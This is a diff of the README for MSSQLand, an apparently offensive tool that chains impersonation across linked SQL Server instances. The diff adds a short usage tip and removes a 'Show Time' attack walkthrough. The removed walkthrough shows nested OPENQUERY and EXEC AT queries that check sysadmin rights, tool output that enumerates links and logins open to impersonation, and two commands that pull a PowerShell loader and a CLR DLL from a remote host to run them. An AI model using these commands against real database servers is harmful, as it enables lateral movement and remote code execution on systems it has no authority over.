@@ -68,6 +68,9 @@ MSSQLand.exe SQL01 -c token -l SQL02:webapp02@appdb,SQL03:webapp03@analytics,SQL
 MSSQLand.exe SQL01 -c token -l SQL02:webapp02,SQL03:webapp03@mydb,SQL04@reporting links
 ```
 
+> [!IMPORTANT]
+> Avoid typing out all the **[RPC Out](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql)** or **[OPENQUERY](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql)** calls manually. Let the tool handle the heavy lifting with the `--link` argument, so you can focus on the big picture.
+
 ## 🫤 Help
 
 - `-h` or `--help` - Show all available actions
@@ -82,103 +85,6 @@ All output tables are Markdown-friendly and can be copied and pasted directly in
 
 > [!TIP]
 > You can also have `.csv` compatible output by using the `-o csv` option: `MSSQLand.exe localhost -c token -o csv procedures > procedures.csv`
-
-## 👑 Show Time
-
-You gain access to a database `SQL01` mapped to the user `dbo`. You need to impersonate `webapp02` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `webapp03` in order to go further and so on and so forth. Let's say you’ve landed an agent inside a `sqlservr.exe` process running under the high-privileged `NT AUTHORITY\SYSTEM`. Lucky you!
-
-After some reconnaissance, you suspect this is a multi-hop linked server chain. Typing out all those **RPC** or **OPENQUERY** calls manually? 
-
-This is what it looks like to verify if you are `sysadmin` in `SQL03` when you have to impersonate `webapp03` on `SQL02` and `webapp04` on `SQL03`:
-
-- [OPENQUERY](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql) (If `sys.servers.is_data_access_enabled`):
-
-```sql
-SELECT * FROM OPENQUERY([SQL02], 'EXECUTE AS LOGIN = ''webapp03''; SELECT * FROM OPENQUERY([SQL03], ''EXECUTE AS LOGIN = ''''webapp04''''; SELECT IS_SRVROLEMEMBER(''''sysadmin''''); REVERT;'') REVERT;')
-```
-
-- [RPC Out](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql) (If `sys.servers.is_rpc_out_enabled`):
-
-```shell
-EXEC ('EXECUTE AS LOGIN = ''webapp03''; EXEC (''EXECUTE AS LOGIN = ''''webapp04''''; SELECT IS_SRVROLEMEMBER(''''sysadmin''''); REVERT;'') AT [SQL03]; REVERT;') AT [SQL02]
-```
-
-No thanks 🚫. Let MSSQLand handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:
-
-```shell
-.\MSSQLand.exe localhost:webapp02 -c token -l SQL02:webapp03,SQL03:webapp04,SQL04 links
-```
-
-The output is as follows:
-```txt
-[>] Trying to connect with TokenCredentials
-[+] Connection opened successfully
-|-> Server: localhost,1433
-|-> Database: master
-|-> Server Version: 15.00.2000
-|-> Client Workstation ID: WS-445c74
-|-> Client Connection ID: b7c172a7-c349-4268-a466-285d2af89fbb
-[i] Logged in on SQL01 as NT AUTHORITY\SYSTEM
-|-> Mapped to the user dbo
-[i] You can impersonate anyone on SQL01 as a sysadmin
-[+] Successfully impersonated user: webapp02
-[i] Logged in as webapp02
-|-> Mapped to the user dbo
-[i] Execution chain: SQL02 -> SQL03 -> SQL04
-[i] Logged in on SQL04 as webapps
-|-> Mapped to the user guest
-
-[>] Executing action 'Links' against SQL04
-|-> Retrieving Linked SQL Servers
-
-| Last Modified        | Link  | Product    | Provider | Data Source | Local Login | Remote Login | RPC Out | OPENQUERY | Collation |
-| -------------------- | ----- | ---------- | -------- | ----------- | ----------- | ------------ | ------- | --------- | --------- |
-| 7/7/2020 1:02:17 PM  | SQL05 | SQL Server | SQLNCLI  | SQL05       | webapp05    | webapps      | True    | True      | False     |
-```
-
-Now you want to verify who you can impersonate at the end of the chain:
-```shell
-.\MSSQLand.exe localhost:webapp02 -c token -l SQL02:webapp03,SQL03:webapp04,SQL04 impersonate
-```
-The output shows:
-
-```txt
-[>] Trying to connect with TokenCredentials
-[+] Connection opened successfully
-|-> Server: localhost,1433
-|-> Database: master
-|-> Server Version: 15.00.2000
-|-> Client Workstation ID: WS-445c74
-|-> Client Connection ID: b7c172a7-c349-4268-a466-285d2af89fbb
-[i] Logged in on SQL01 as NT AUTHORITY\SYSTEM
-|-> Mapped to the user dbo
-[i] You can impersonate anyone as a sysadmin
-[+] Successfully impersonated user: webapp02
-[i] Server chain: SQL02 -> SQL03 -> SQL04
-[i] Logged in as webapps
-|-> Mapped to the user guest
-
-[>] Executing action 'Impersonation' against SQL04
-|-> Starting impersonation check for all logins
-|-> Checking impersonation permissions individually
-
-| Logins      | Impersonation |
-| ----------- | ------------- |
-| sa          | No            |
-| MarieJo     | Yes           |
-| Imane       | Yes           |
-| John        | No            |
-```
-
-Great! Now you can directly reach out to your loader with:
-```shell
-.\MSSQLand.exe localhost:webapp02 -c token -l SQL02:webapp03,SQL03:webapp04,SQL04:MarieJo pwshdl "172.16.118.218/d/g/hollow.ps1"
-```
-
-Or even use Common Language Runtime (CLR) to load remotely a library with:
-```shell
-.\MSSQLand.exe localhost:webapp02 -c token -l SQL02:webapp03,SQL03:webapp04,SQL04:MarieJo clr "http://172.16.118.218/d/SqlLibrary.dll"
-```
 
 ## 🤝 Contributing 
 
